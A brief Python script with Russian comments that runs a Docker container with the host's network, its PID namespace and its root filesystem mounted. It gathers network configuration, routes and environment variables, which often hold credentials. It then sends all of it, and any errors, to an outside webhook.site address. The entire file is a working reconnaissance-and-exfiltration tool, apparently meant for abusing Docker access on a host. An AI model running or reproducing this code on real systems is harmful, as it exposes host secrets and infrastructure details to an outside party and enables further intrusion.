import subprocess
import requests

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def explore_host_deep():
    try:
        # Пример: собираем инфо о сети (ip a) и процессах (ps aux) хоста
        # Мы запускаем alpine с сетевым режимом хоста (--net=host) и pid-пространством хоста (--pid=host)
        cmd = [
            "docker", "run", "--rm", 
            "--net=host", 
            "--pid=host", 
            "-v", "/:/mnt/host", 
            "alpine", "sh", "-c", 
            "echo '=== NET ===' && ip a && echo '=== ROUTE ===' && ip route && echo '=== ENV ===' && env"
        ]
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode()
        
        requests.post(WEBHOOK_URL, json={"host_deep_analysis": output})
    except Exception as e:
        requests.post(WEBHOOK_URL, json={"error": str(e)})

if __name__ == "__main__":
    explore_host_deep()
